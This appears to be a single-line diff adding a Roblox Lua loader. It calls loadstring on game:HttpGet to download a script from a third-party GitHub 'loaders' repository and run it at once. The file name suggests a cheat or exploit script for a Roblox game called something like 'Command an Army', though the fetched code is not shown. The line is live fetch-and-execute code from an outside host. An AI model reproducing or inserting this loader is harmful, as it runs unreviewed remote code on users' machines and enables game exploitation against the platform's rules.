@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BaseLizardFascinate/loaders/main/loaders/upd-command-an-army-spam0-qqoysxv1gty6ve.lua"))()
